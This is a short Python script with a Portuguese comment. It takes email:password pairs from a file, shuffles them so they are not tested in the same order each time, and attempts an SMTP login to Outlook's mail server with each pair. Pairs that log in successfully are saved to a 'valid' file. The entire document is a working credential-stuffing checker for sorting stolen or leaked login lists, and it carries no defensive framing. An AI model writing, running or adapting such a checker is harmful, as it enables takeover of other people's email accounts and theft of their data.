import smtplib
import random

def is_valid_email(email, password):
    try:
        server = smtplib.SMTP("smtp-mail.outlook.com", 587)
        server.starttls()
        server.login(email, password)
        server.quit()
        return True
    except:
        return False

def main():
    input_file = 'outlooks.txt'
    output_file = 'valid_outlooks.txt'
    
    with open(input_file, 'r') as infile, open(output_file, 'a') as outfile:
        lines = infile.readlines()
        random.shuffle(lines)  # Embaralha as linhas para não testar na mesma ordem
        
        for line in lines:
            email, password = line.strip().split(":")
            
            if is_valid_email(email, password):
                print(f"{email}:{password} | VALID")
                outfile.write(f"{email}:{password}\n")
            else:
                print(f"{email}:{password} | INVALID")

if __name__ == "__main__":
    main()
